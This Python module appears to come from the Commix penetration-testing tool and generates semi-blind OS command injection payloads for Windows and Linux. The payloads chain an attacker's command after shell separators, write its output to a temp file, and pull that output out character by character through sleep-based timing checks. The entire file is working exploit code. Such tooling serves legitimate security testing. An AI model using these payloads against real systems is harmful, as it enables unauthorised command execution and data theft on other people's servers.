#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.injections.controller import checks
from src.thirdparty.six.moves import urllib as _urllib

"""
The "tempfile-based" technique on Semiblind OS Command Injection.
The available "tempfile-based" payloads.
"""

"""
Tempfile-based decision payload (check if host is vulnerable).
"""
def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + pipe +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                "((Get-Content " + OUTPUT_TEXTFILE + ").length)\"')" + settings.SINGLE_WHITESPACE +
                "do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + ampersand +
                "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                "((Get-Content " + OUTPUT_TEXTFILE + ").length)\"')" + settings.SINGLE_WHITESPACE +
                "do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

  else:
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                "str=$(echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ")" + separator +
                "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                # Find the length of the output.
                "str1=$(expr length \"$str\")" + separator +
                #"str1=${%23str}" + separator +
                "if [ " + str(j) + " -ne ${str1} ]" + separator +
                "then sleep 0" + separator +
                "else sleep " + str(timesec) + separator +
                "fi "
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "sleep 0" + separator +
                "str=$(echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ")" + separator +
                "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                "str1=$(expr length \"$str\")" + separator +
                #"str1=${%23str} " + separator +
                "[ " + str(j) + " -eq ${str1} ] " + separator +
                "sleep " + str(timesec)
                )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + 
                "[ " + str(j) + " -ne $(cat " + OUTPUT_TEXTFILE + 
                pipe + "tr -d '\\n'" + 
                pipe + "wc -c) ] " + separator +
                "sleep " + str(timesec)
                )  
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + pipe +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                )
    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                )
  else:  
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator +
                # Find the length of the output, using readline().
                "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\")" + separator +
                "if [ " + str(j) + " -ne ${str1} ]" + separator +
                "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
                "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                "fi "
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator +
                # Find the length of the output, using readline().
                "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") " + separator +
                "[ " + str(j) + " -eq ${str1} ] " + separator +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + settings.SINGLE_WHITESPACE +
                # Find the length of the output, using readline().
                "[ " + str(j) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") ] " + separator +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                ) 
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or \
       settings.REFERER_INJECTION == True or \
       settings.HOST_INJECTION == True or \
       settings.CUSTOM_HEADER_INJECTION == True:
      payload = payload.replace("\n", ";")
    else:
      if settings.TARGET_OS != "win":
        payload = payload.replace("\n","%0d")      
  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd + 
                "\"') do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" + pipe +
                "for /f \"tokens=*\" %y in ('cmd /c \"powershell.exe -InputFormat none "
                "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                "do if %y==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\"" +
                # Transform to ASCII
                pipe +
                "for /f \"tokens=*\" %x in ('cmd /c \"" +
                "powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c " + cmd + ")))\"')" + settings.SINGLE_WHITESPACE +
                "do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%x'" 
                )
    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
               "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd + 
                "\"') do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" + ampersand +
                "for /f \"tokens=*\" %y in ('cmd /c \"powershell.exe -InputFormat none "
                "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                "do if %y==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\"" +
                # Transform to ASCII
                ampersand +
                "for /f \"tokens=*\" %x in ('cmd /c \"" +
                "powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c " + cmd + ")))\"')" + settings.SINGLE_WHITESPACE +
                "do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%x'" 
                )

  else:
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                "str=$(" + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                "echo $str > " + OUTPUT_TEXTFILE + separator +
                "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                # Find the length of the output.
                "str1=$(expr length \"$str\")" + separator +
                #"str1=${%23str}" + separator +
                "if [ " + str(j) + " -ne ${str1} ]" + separator +
                "then sleep 0 " + separator +
                "else sleep " + str(timesec) + separator +
                # Transform to ASCII
                "str1=$(od -A n -t d1 < " +OUTPUT_TEXTFILE + ")" + separator +
                "echo $str1 > " + OUTPUT_TEXTFILE + separator +
                "fi "
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "sleep 0 " + separator +
                "str=$(" + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr -d '\\n'<" + OUTPUT_TEXTFILE + ")" + separator +
                "echo $str" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
                "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                # Find the length of the output.
                "str1=$(expr length \"$str\")" + separator +
                #"str1=${%23str}" + separator +
                "[ " + str(j) + " -eq ${str1} ]" + separator +
                "sleep " + str(timesec) + separator +
                # Transform to ASCII
                "str1=$(od -A n -t d1<" + OUTPUT_TEXTFILE + ")" + separator +
                "echo $str1" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE 
                )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)
      
    elif separator == "||" :                
      pipe = "|"
      cmd = cmd.rstrip()
      cmd = checks.add_command_substitution(cmd)
      payload = (pipe +
                cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + 
                "[ " + str(j) + " -ne $(cat " + OUTPUT_TEXTFILE + pipe + 
                "tr -d '\\n'" + pipe + "wc -c) ]" + separator +
                "sleep " + str(timesec)
                )                    
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd + 
                "') do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" + pipe +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                )
    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd + 
                "') do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" + ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                )
  else: 
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + separator +
                # Find the length of the output, using readline().
                "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\")" + separator +
                "if [ " + str(j) + " -ne ${str1} ] " + separator +
                "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
                "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                "fi "
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + separator +
                # Find the length of the output, using readline().
                "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " + separator +
                "[ " + str(j) + " -eq ${str1} ] " + separator +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator) 

    elif separator == "||" :     
      pipe = "|"
      payload = (pipe +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" + settings.SINGLE_WHITESPACE +
                "[ " + str(j) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") ] " + separator +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                )                   
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or \
       settings.REFERER_INJECTION == True or \
       settings.HOST_INJECTION == True or \
       settings.CUSTOM_HEADER_INJECTION == True:
      payload = payload.replace("\n", ";")
    else:
      if settings.TARGET_OS != "win":
        payload = payload.replace("\n","%0d")
  return payload

"""
Get the execution output, of shell execution.
"""
def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" + str(num_of_chars - 1) + "]\"')" + settings.SINGLE_WHITESPACE +
                "do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" + str(num_of_chars - 1) + "]\"')" + settings.SINGLE_WHITESPACE +
                "do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

  else:
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                # Use space as delimiter
                "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE + ")" + separator +
                "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
                "then sleep 0" + separator +
                "else sleep " + str(timesec) + separator +
                "fi "
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "sleep 0" + separator +
                # Use space as delimiter
                "str=$(awk '{print$" + str(num_of_chars) + "}'<" + OUTPUT_TEXTFILE + ")" + separator +
                "[ " + str(ascii_char) + " -eq ${str} ] " + separator +
                "sleep " + str(timesec)
                )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)
        
    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + " -ne $(cat " + OUTPUT_TEXTFILE + 
                pipe + "tr -d '\\n'" + 
                pipe + "cut -c " + str(num_of_chars) + 
                pipe + "od -N 1 -i" + 
                pipe + "head -1" + 
                pipe + "awk '{print$2}') ] " + separator +
                "sleep " + str(timesec)
                )
    else:
      pass
  #
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(ord(file.read().strip()[" + str(num_of_chars - 1) + "][0])); exit(0)\""
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                )
    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + 
                "for /f \"tokens=*\" %i in ('cmd /c " + 
                python_payload +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                )
  else: 
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\")" + separator +
                "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
                "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
                "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                "fi "
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\")" + separator +
                "[ " + str(ascii_char) + " -eq ${str} ] " + separator +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + " -ne  $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\") ] " + separator +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                )
    else:
      pass

    if settings.USER_AGENT_INJECTION == True or \
       settings.REFERER_INJECTION == True or \
       settings.HOST_INJECTION == True or \
       settings.CUSTOM_HEADER_INJECTION == True:
      payload = payload.replace("\n", ";")
    else:
      if settings.TARGET_OS != "win":
        payload = payload.replace("\n","%0d")
  return payload

"""
Get the execution output, of shell execution.
"""
def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                "do if %i==" + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + 
                "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                "do if %i==" + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

  else:  
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator +
                "if [ " + str(ord(str(ascii_char))) + " -ne ${str} ]" + separator +
                "then sleep 0" + separator +
                "else sleep " + str(timesec) + separator +
                "fi "
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "sleep 0" + separator +
                "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator +
                "[ " + str(ord(str(ascii_char))) + " -eq ${str} ] " + separator +
                "sleep " + str(timesec)
                )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)
        
    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + " -ne  $(cat " + OUTPUT_TEXTFILE + ") ] " + separator +
                "sleep " + str(timesec)
                )
    else:
      pass

  
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "]); exit(0)\""
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                )
    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + 
                "for /f \"tokens=*\" %i in ('cmd /c " + 
                python_payload +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                )
  else: 
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\")" + separator +
                "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
                "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
                "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                "fi "
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\") " + separator +
                "[ " + str(ascii_char) + " -eq ${str} ] " + separator +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + " -ne  $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\") ] " + separator +
                "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                )
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or \
       settings.REFERER_INJECTION == True or \
       settings.HOST_INJECTION == True or \
       settings.CUSTOM_HEADER_INJECTION == True:
      payload = payload.replace("\n",";")
    else:
      if settings.TARGET_OS != "win":
        payload = payload.replace("\n","%0d")
  return payload
  
# eof